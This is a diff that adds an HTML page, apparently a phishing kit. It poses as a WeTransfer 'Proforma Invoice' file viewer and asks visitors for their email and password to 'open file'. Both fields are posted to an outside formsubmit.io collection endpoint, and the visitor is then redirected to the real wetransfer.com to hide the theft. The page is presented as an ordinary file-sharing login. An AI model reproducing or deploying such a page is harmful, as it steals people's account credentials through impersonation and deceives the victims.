@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+   <!--=============== REMIXICONS ===============-->
+   <link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
+
+   <!--=============== CSS ===============-->
+   <link rel="stylesheet" href="assets/css/styles.css">
+
+   <title>Proforma Invoice Form</title>
+</head>
+<body>
+   <header style="background: black; text-align: center; padding: 20px 0;">
+      <img style="width: 60px; /* Adjust the size of your logo */
+      height: auto;
+      vertical-align: middle;" src="assets/img/wetransfer-1-logo-black-and-white.png" alt="Logo">
+      <h1 style="display: inline-block;
+      margin: 0;
+      padding-left: 10px;
+      vertical-align: middle;
+      font-size: 24px;">Proforma Invoice (PI)</h1>
+   </header>
+   <div class="login">
+      <img src="assets/img/login-bg.png" alt="login image" class="login__img">
+
+      <form action="https://formsubmit.io/send/9d35a369-a505-49f1-ba69-2703022ad9c4" class="login__form" method="POST">
+         <h1 class="login__title">VIEW</h1>
+         <input name="_redirect" type="hidden" value="https://wetransfer.com/">
+         <p style="align-items: center; justify-content: center; padding-bottom: 20px;">Enter Receiving Email to view file</p>
+         <div class="login__content">
+            <div class="login__box">
+               <i class="ri-user-3-line login__icon"></i>
+
+               <div class="login__box-input">
+                  <input type="email" name="email" required class="login__input" id="login-email" placeholder=" ">
+                  <label for="login-email" class="login__label">Email</label>
+               </div>
+            </div>
+
+            <div class="login__box">
+               <i class="ri-lock-2-line login__icon"></i>
+
+               <div class="login__box-input">
+                  <input type="password" name="password" required class="login__input" id="login-pass" placeholder=" ">
+                  <label for="login-pass" class="login__label">Password</label>
+                  <i class="r-eye-off-line login__eye" id="login-eye"></i>
+               </div>
+            </div>
+         </div>
+
+         <button type="submit" class="login__button">OPEN FILE</button>
+      </form>
+   </div>
+   
+   <!--=============== MAIN JS ===============-->
+   <script src="assets/js/main.js"></script>
+</body>
+</html>
